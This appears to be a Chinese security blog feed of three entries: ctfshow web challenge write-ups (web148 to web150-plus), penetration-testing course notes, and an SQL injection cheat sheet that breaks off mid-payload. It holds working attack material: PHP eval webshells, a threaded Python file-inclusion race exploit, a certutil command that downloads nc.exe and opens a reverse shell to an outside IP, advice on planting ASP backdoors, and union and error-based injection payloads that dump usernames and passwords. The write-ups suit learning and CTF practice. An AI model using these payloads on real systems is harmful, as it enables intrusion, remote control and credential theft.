class="line">&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET</span><br><span class="line">$&#123;_GET&#125;[哼]($&#123;_GET&#125;[嗯]);&amp;哼=call_user_func&amp;嗯=get_ctfshow_fl0g</span><br></pre></td></tr></table></figure><p>这里是直接一个回调，利用现成的函数来读取flag.php</p><h3 id="web149——条件竞争"><a href="#web149——条件竞争" class="headerlink" title="web149——条件竞争"></a>web149——条件竞争</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>); <span class="comment">//unlink() 函数删除文件。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]); <span class="comment">//file_put_contents会覆盖之前文件的内容</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>你不删除index.php，那么我就往index.php中写个木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ctf=index.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;yn8rt&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="方法二：-2"><a href="#方法二：-2" class="headerlink" title="方法二："></a>方法二：</h4><p>条件竞争：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ctf=<span class="number">1</span>.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /f*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非预期解：</p><p>ua头写入一句话</p><p>include包含(/var/log/nginx/access.log)</p><p>session包含脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 20.12.5 13:52</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;ctf&quot;</span>: <span class="string">&quot;/tmp/sess_test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>: <span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://7445f895-6f17-4435-adc0-62055d7f0cb7.chall.ctf.show/&#x27;</span>,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        res = session.post(</span><br><span class="line">            <span class="string">&#x27;http://7445f895-6f17-4435-adc0-62055d7f0cb7.chall.ctf.show/?isVIP=1&#x27;</span>,</span><br><span class="line">            data=data</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure><h3 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150-plus"></a>web150-plus</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol><li>名词解释-渗透测试-漏洞&amp;攻击&amp;后门&amp;代码&amp;专业词 </li><li>必备技能-操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙 </li><li>必备技能-文件下载-缘由&amp;场景&amp;使用-提权&amp;后渗透 </li><li>必备技能-反弹命令-缘由&amp;场景&amp;使用-提权&amp;后渗透 </li></ol><p>前后端，POC/EXP，Payload/Shellcode，后门/Webshell，木马/病毒， 反弹，回显，跳板，黑白盒测试，暴力破解，社会工程学，撞库，ATT&amp;CK 等<br>参考：<br><a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a><br><a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a><br><a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a><br><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#基础案例 1：操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙 </span><br><span class="line">1、个人计算机&amp;服务器用机</span><br><span class="line">2、Windows&amp;Linux 常见命令</span><br><span class="line">3、文件权限&amp;服务权限&amp;用户权限等</span><br><span class="line">4、系统用户&amp;用户组&amp;服务用户等分类</span><br><span class="line">5、自带防火墙出站&amp;入站规则策略协议</span><br><span class="line"></span><br><span class="line">#实用案例 1：文件上传下载-解决无图形化&amp;解决数据传输</span><br><span class="line">Linux：wget curl python ruby perl java 等</span><br><span class="line">Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等</span><br><span class="line"></span><br><span class="line">#实用案例 2：反弹 Shell 命令-解决数据回显&amp;解决数据通讯 useradd 用户名 passwd 用户名 测试 Linux 系统添加用户或修改密码命令交互回显问题 </span><br><span class="line"></span><br><span class="line">#结合案例 1：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器 </span><br><span class="line">1、内网： </span><br><span class="line">内网 -&gt; xiaodi8</span><br><span class="line">xiaodi8 !-&gt; 内网 </span><br><span class="line">2、防火墙： </span><br><span class="line">xiaodi8 &lt;-&gt; aliyun</span><br><span class="line">xiaodi8 防火墙 -&gt; aliyun</span><br><span class="line">aliyun !-&gt; xiaodi8 防火墙</span><br><span class="line"></span><br><span class="line">#结合案例 2：学会了有手就行-Fofa 拿下同行 Pikachu 服务器 文件下载&amp;反弹 Shell: </span><br><span class="line">certutil -urlcache -split -f http://www.xiaodi8.com/nc.exe</span><br><span class="line">nc.exe nc -e cmd 47.75.212.155 5566</span><br></pre></td></tr></table></figure><p>asp程序的数据库下载植入<br>一般asp程序都会使用经典套件，当使用access数据库时，一般后缀名都是<br>db.asp（可解析） dh.asa db.mdb(可下载)<br>当数据库文件是 mdb格式文件时，可以直接访问数据库文件，然后本地就会下载该数据库，使用数据库工具打开即可获得所有数据库信息</p><h2 id="ASP-数据库-MDB-默认下载"><a href="#ASP-数据库-MDB-默认下载" class="headerlink" title="ASP-数据库-MDB 默认下载"></a>ASP-数据库-MDB 默认下载</h2><p>/database/powereasy2006.mdb 默认下载路径<br>/admin/Admin_Login.asp 后台</p><h2 id="ASP-数据库-ASP-后门植入连接"><a href="#ASP-数据库-ASP-后门植入连接" class="headerlink" title="ASP-数据库-ASP 后门植入连接"></a>ASP-数据库-ASP 后门植入连接</h2><p>当数据库文件是 asp格式时，可以找到相应的可以在数据交互的地方，如留言板，文件上传等功能点，插入后门代码。使用一句话连接工具 菜刀/蚁剑等工具直接连接数据库文件即可解析后门。</p><h2 id="ASP-中间件-IIS-短文件名探针-安全漏洞"><a href="#ASP-中间件-IIS-短文件名探针-安全漏洞" class="headerlink" title="ASP-中间件-IIS 短文件名探针-安全漏洞"></a>ASP-中间件-IIS 短文件名探针-安全漏洞</h2><p>这是IIS目前通用的漏洞。只需要使用脚本即可探针到网站目录，与常规的<br>目录扫描工具是不同点在于，目录爆破工具是通过现有的字典跑文件或文<br>件夹名，但是IIS的短文件名探针时IIS中间件的漏洞。但是局限性也很大，<br>只能探针六位长度的文件或文件夹。</p><h2 id="ASP-中间件-IIS-文件上传解析-安全漏洞"><a href="#ASP-中间件-IIS-文件上传解析-安全漏洞" class="headerlink" title="ASP-中间件-IIS 文件上传解析-安全漏洞"></a>ASP-中间件-IIS 文件上传解析-安全漏洞</h2><h2 id="ASP-中间件-IIS-配置目录读写-安全配置"><a href="#ASP-中间件-IIS-配置目录读写-安全配置" class="headerlink" title="ASP-中间件-IIS 配置目录读写-安全配置"></a>ASP-中间件-IIS 配置目录读写-安全配置</h2><p>当管理人员出现配置错误之时候，属性的主目录下权限给予了写入且web服务拓展允许了webDAV时</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结</title>
      <link href="/posts/ef82.html"/>
      <url>/posts/ef82.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、sql注入概述"><a href="#一、sql注入概述" class="headerlink" title="一、sql注入概述"></a>一、sql注入概述</h2><p> SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息,在实战和测试中，难免会遇见到一些sql注入，下面，我将总结一些常用sql注入中的不同姿势。</p><h2 id="二、寻找sql注入"><a href="#二、寻找sql注入" class="headerlink" title="二、寻找sql注入"></a>二、寻找sql注入</h2><p>测试注入点：</p><ol><li>在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入<br> <strong>注入点判断：</strong><code>id=1&#39;（常见）id=1&quot; id=1&#39;) id=1&#39;)) id=1&quot;) id=1&quot;))</code></li><li>通过构造get、post、cookie请求再相应的http头信息等查找敏感喜喜</li><li>通过构造一些语句，检测服务器中响应的异常</li></ol><h2 id="三、sql注入的类型"><a href="#三、sql注入的类型" class="headerlink" title="三、sql注入的类型"></a>三、sql注入的类型</h2><p>附上自己整理的思维导图学习</p><p><img src="https://image.3001.net/images/20220714/1657765090_62cf7ce22bc5cb101dc1b.png!small" alt="image"></p><p>常见的数据库类型，分为关系型数据库和非关系型数据库</p><p>关系型数据库有 <code>Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access 和 MySQL</code>等。</p><p>非关系型数据库有 <code>Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase</code>等</p><h2 id="Mysql注入"><a href="#Mysql注入" class="headerlink" title="Mysql注入"></a>Mysql注入</h2><p><img src="https://image.3001.net/images/20220714/1657765211_62cf7d5ba9f990b10b6f3.png!small" alt="image"></p><h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3><p>数字型：</p><p>测试步骤：</p><p>（1） 加单引号，URL：xxx.xxx.xxx/xxx.php?id=3’；</p><p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>（2） 加and 1=1 ，URL：xxx.xxx.xxx/xxx.php?id=3 and 1=1；</p><p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面没有差异；</p><p>（3） 加and 1=2，URL：xxx.xxx.xxx/xxx.php?id=3 and 1=2；</p><p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异；</p><p>字符型</p><p>测试步骤：</p><p>（1） 加单引号：select * from table where name=’admin’’；</p><p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p><p>（2） 加 ‘ and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ，也无法进行注入，还需要通过注释符号将其绕过；</p><p>因此，构造语句为：select * from table where name =’admin’ and 1=—‘ 可成功执行返回结果正确；</p><p>（3） 加and 1=2— 此时sql语句为：select * from table where name=’admin’ and 1=2–’则会报错；</p><p>如果满足以上三点，可以判断该url为字符型注入。</p><p>判断列数：</p><p>?id=1’ order by 4# 报错</p><p>?id=1’ order by 3# 没有报错，说明存在3列</p><p>爆出数据库：</p><p>?id=-1’ union select 1,database(),3—+</p><p>?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata#</p><p>爆出数据表：</p><p>?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’数据库’#</p><p>爆出字段：</p><p>?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’数据表’#</p><p>爆出数据值：</p><p>?id=-1’ union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名—+</p><p>拓展一些其他函数：</p><p>system_user() 系统用户名</p><p>user() 用户名</p><p>current_user 当前用户名</p><p>session_user()连接数据库的用户名</p><p>database() 数据库名</p><p>version() MYSQL数据库版本</p><p>load_file() MYSQL读取本地文件的函数</p><p>@@datadir 读取数据库路径</p><p>@@basedir MYSQL 安装路径</p><p>@@version_compile_os 操作系统</p><p>多条数据显示函数：</p><p>concat()、group_concat()、concat_ws()</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>extractvalue函数：</p><p>?id=1’ and extractvalue(1, concat(0x7e,(select @@version),0x7e))—+ (爆出版本号)</p><p>?id=1’ and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))—+ (爆出操作系统)</p><p>?id=1’ and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))—+ （爆数据库）</p><p>?id=1’ and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1),0x7e))—+ （爆数据表）</p><p>?id=1’ and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 3,1),0x7e))—+（爆字段）</p><p>?id=1’ and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))—+ （爆数据）</p><p>updatexml函数：</p><p>细节问题： extractvalue()基本一样，改个关键字updatexml即可,与extractvalue有个很大的区别实在末尾注入加上，如：（1，concat(select @@version),1),而extractvalue函数末尾不加1（数值）</p><p>?id=1’ and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),<strong><code>1</code></strong>)—+ （爆数据库）</p><p>?id=1’ and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)—+ （爆数据表）</p><p>?id=1’ and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 3,1),0x7e),1)—+ （爆字段）</p><p>?id=1’ and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)—+</p><p>exp函数溢出错误：</p><p>在mysql&gt;5.5.53时，则不能返回查询结果</p><p>floor函数：</p><p>?id=1’ union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a—+</p><p>?id=1’ union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 